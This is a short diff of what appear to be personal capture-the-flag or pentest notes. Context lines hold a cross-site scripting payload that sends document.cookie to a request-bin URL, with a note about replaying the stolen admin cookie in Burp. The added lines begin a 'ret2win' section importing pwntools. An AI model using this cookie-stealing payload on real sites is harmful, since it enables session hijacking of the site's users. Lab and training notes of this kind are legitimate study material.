@@ -67,3 +67,9 @@ format_string.execute_writes()
 Grab session cookie
 <script>window.location.replace("https://requestbin.kanbanbox.com/XXXXXXX?" + document.cookie)</script>
         set up request bin and grab admin cookie.. then user repeater in burp to change the cookie
+
+################################################################################
+
+ret2win
+
+from pwn import *
